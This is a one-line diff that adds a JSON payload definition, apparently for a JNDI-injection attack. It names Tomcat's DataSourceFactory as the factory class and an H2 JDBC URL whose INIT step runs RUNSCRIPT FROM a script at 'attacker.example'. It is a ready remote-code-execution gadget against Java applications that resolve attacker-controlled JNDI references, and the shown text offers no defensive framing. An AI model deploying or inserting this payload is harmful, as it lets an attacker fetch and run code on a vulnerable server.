@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"org.apache.tomcat.jdbc.pool.DataSourceFactory","reference_class":"javax.sql.DataSource","factory_attrs":{"url":"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'","driverClassName":"org.h2.Driver"}}
